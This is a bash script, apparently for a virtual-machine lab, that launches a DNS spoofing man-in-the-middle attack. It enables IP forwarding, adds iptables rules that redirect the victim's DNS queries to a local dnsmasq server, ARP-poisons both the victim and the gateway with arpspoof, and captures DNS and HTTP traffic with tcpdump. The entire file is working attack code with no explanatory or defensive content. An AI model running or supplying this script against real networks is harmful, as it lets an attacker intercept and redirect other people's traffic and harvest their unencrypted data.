#!/bin/bash
# Start DNS Spoofing Attack (Run on VM2 - Attacker)

VICTIM_IP="192.168.1.10"
GATEWAY_IP="192.168.1.254"
INTERFACE="eth0"

echo "=========================================="
echo "DNS SPOOFING ATTACK - STARTING"
echo "=========================================="
echo "Victim IP:   $VICTIM_IP"
echo "Gateway IP:  $GATEWAY_IP"
echo "Interface:   $INTERFACE"
echo "=========================================="
echo ""

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    echo "[!] Please run as root (use sudo)"
    exit 1
fi

# 1. Enable IP forwarding
echo "[*] Step 1: Enabling IP forwarding..."
sysctl -w net.ipv4.ip_forward=1 > /dev/null
echo "    ✓ IP forwarding enabled"

# 2. Configure iptables for DNS redirection
echo "[*] Step 2: Configuring iptables..."

# Redirect DNS packets to local dnsmasq (port 53)
iptables -t nat -A PREROUTING -i $INTERFACE -p udp --dport 53 -j DNAT --to-destination 192.168.1.20:53
echo "    ✓ DNS redirection rule added"

# Enable masquerading for forwarded packets
iptables -t nat -A POSTROUTING -j MASQUERADE
echo "    ✓ IP masquerading enabled"

# 3. Start dnsmasq
echo "[*] Step 3: Starting dnsmasq DNS server..."
systemctl stop systemd-resolved 2>/dev/null
killall dnsmasq 2>/dev/null
sleep 1
dnsmasq -C /etc/dnsmasq.conf
sleep 2

if pgrep -x "dnsmasq" > /dev/null; then
    echo "    ✓ dnsmasq started successfully"
else
    echo "    ✗ dnsmasq failed to start"
    echo "    Check /var/log/dnsmasq.log for errors"
    exit 1
fi

# 4. Start ARP spoofing
echo "[*] Step 4: Starting ARP spoofing..."
echo "    - Poisoning victim ($VICTIM_IP) against gateway ($GATEWAY_IP)"
arpspoof -i $INTERFACE -t $VICTIM_IP $GATEWAY_IP > /dev/null 2>&1 &
ARPSPOOF_PID1=$!
sleep 1

echo "    - Poisoning gateway ($GATEWAY_IP) against victim ($VICTIM_IP)"
arpspoof -i $INTERFACE -t $GATEWAY_IP $VICTIM_IP > /dev/null 2>&1 &
ARPSPOOF_PID2=$!
sleep 1

if ps -p $ARPSPOOF_PID1 > /dev/null && ps -p $ARPSPOOF_PID2 > /dev/null; then
    echo "    ✓ ARP spoofing active"
else
    echo "    ✗ ARP spoofing failed to start"
    exit 1
fi

# 5. Start packet capture
echo "[*] Step 5: Starting packet capture..."
PCAP_FILE="/tmp/dns-attack-$(date +%Y%m%d-%H%M%S).pcap"
tcpdump -i $INTERFACE -w "$PCAP_FILE" 'port 53 or port 80' > /dev/null 2>&1 &
TCPDUMP_PID=$!
echo "    ✓ Capturing to: $PCAP_FILE"

# Save PIDs for cleanup
echo "$ARPSPOOF_PID1" > /tmp/arpspoof1.pid
echo "$ARPSPOOF_PID2" > /tmp/arpspoof2.pid
echo "$TCPDUMP_PID" > /tmp/tcpdump.pid
echo "$PCAP_FILE" > /tmp/pcap_file.txt

echo ""
echo "=========================================="
echo "✓ ATTACK IS NOW ACTIVE"
echo "=========================================="
echo ""
echo "Monitor DNS queries:"
echo "  tail -f /var/log/dnsmasq.log"
echo ""
echo "Monitor traffic:"
echo "  sudo tcpdump -i $INTERFACE -n port 53 or port 80"
echo ""
echo "To stop the attack:"
echo "  ./stop-attack.sh"
echo ""
echo "=========================================="

